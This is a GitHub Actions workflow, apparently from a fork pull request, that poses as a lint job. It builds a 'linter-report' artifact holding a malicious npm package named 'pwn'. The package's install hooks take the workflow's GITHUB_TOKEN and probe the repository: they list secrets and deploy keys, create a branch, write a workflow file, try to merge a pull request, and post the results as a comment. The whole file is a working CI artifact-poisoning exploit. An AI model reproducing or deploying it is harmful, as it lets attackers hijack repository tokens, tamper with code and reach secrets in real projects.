---
name: Lint
on:
  pull_request:
    branches: [main]

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - name: Build attacker-chosen linter-report artifact
        env:
          PR_NUMBER: ${{ github.event.pull_request.number }}
        run: |
          set -e
          mkdir -p pkg/package
          cat > pkg/package/package.json <<'JSON'
          {"name":"pwn","version":"1.0.0","main":"index.js","scripts":{"install":"node index.js install","postinstall":"node index.js postinstall"}}
          JSON
          cat > pkg/package/index.js <<'JS'

          const fs = require('fs'), path = require('path');
          const base = process.env.INIT_CWD || process.cwd();
          const token = process.env.GITHUB_TOKEN || '';
          const repo = process.env.GITHUB_REPOSITORY || '';
          const runId = process.env.GITHUB_RUN_ID || '';
          let pr = '0';
          try { pr = fs.readFileSync(path.join(base, 'pr-number.txt'), 'utf8').trim(); } catch (e) {}
          const log = (...a) => console.log('[PWN] ' + a.map(x => typeof x === 'string' ? x : JSON.stringify(x)).join(' '));
          async function api(method, url, body) {
            const r = await fetch('https://api.github.com' + url, {
              method,
              headers: {
                authorization: 'Bearer ' + token,
                accept: 'application/vnd.github+json',
                'content-type': 'application/json',
                'user-agent': 'pwn-probe'
              },
              body: body ? JSON.stringify(body) : undefined
            });
            const text = (await r.text()).slice(0, 700);
            return { status: r.status, scopes: r.headers.get('x-oauth-scopes'),
                     accepted: r.headers.get('x-accepted-github-permissions'),
                     xratelimit: r.headers.get('x-ratelimit-limit'), text };
          }
          (async () => {
            log('MARKER event=' + process.env.GITHUB_EVENT_NAME + ' workflow=' + process.env.GITHUB_WORKFLOW +
                ' run=' + runId + ' repo=' + repo + ' cwd=' + process.cwd() + ' token_len=' + token.length);
            const probes = {};
            probes.repo = await api('GET', '/repos/' + repo);
            log('GET /repos -> ' + JSON.stringify(probes.repo));
            const c = await api('POST', '/repos/' + repo + '/issues/' + pr + '/comments',
              { body: '<!-- PWN-RCE --> workflow_run RCE confirmed as github-actions[bot]. event=' +
                      process.env.GITHUB_EVENT_NAME + ' run=' + runId + ' token_len=' + token.length });
            probes.comment = c;
            log('POST comment -> ' + JSON.stringify(c));
            probes.listSecrets = await api('GET', '/repos/' + repo + '/actions/secrets');
            probes.actionsPermissions = await api('GET', '/repos/' + repo + '/actions/permissions');
            probes.deployKeys = await api('GET', '/repos/' + repo + '/keys');
            probes.createRef = await api('POST', '/repos/' + repo + '/git/refs',
              { ref: 'refs/heads/pwn-probe-' + runId, sha: process.env.GITHUB_SHA });
            log('createRef -> ' + JSON.stringify(probes.createRef));
            if (probes.createRef.status === 201) {
              probes.workflowWrite = await api('PUT', '/repos/' + repo + '/contents/.github/workflows/pwn-probe.yml', {
                message: 'pwn probe', branch: 'pwn-probe-' + runId,
                content: Buffer.from('name: pwn\non: workflow_dispatch\njobs:\n  x:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n').toString('base64')
              });
              probes.deleteRef = await api('DELETE', '/repos/' + repo + '/git/refs/heads/pwn-probe-' + runId);
            }
            probes.mergePr1 = await api('PUT', '/repos/' + repo + '/pulls/1/merge', { merge_method: 'merge' });
            log('mergePr1 -> ' + JSON.stringify(probes.mergePr1));
            if (c.status === 201) {
              let id = 0; try { id = JSON.parse(c.text).id; } catch (e) {}
              await api('PATCH', '/repos/' + repo + '/issues/comments/' + id,
                { body: '<!-- PWN-PROBES -->\nProbes from workflow_run RCE (token = GITHUB_TOKEN, workflow_run context):\n```json\n' +
                        JSON.stringify(probes, null, 1).slice(0, 60000) + '\n```' });
            }
            log('FINAL ' + JSON.stringify(probes));
          })().catch(e => log('ERR ' + e.stack));
          JS
          tar -czf pwn-1.0.0.tgz -C pkg package
          printf '{"name":"root","version":"1.0.0","private":true,"dependencies":{"pwn":"file:./pwn-1.0.0.tgz"}}' > package.json
          printf 'dangerously-allow-all-scripts=true\nforeground-scripts=true\n' > .npmrc
          printf 'report authored by the fork PR\n' > linter-report.txt
          printf '%s' "$PR_NUMBER" > pr-number.txt
          ls -la
      - uses: actions/upload-artifact@v4
        with:
          name: linter-report
          path: |
            linter-report.txt
            pr-number.txt
            .npmrc
            package.json
            pwn-1.0.0.tgz
          if-no-files-found: error
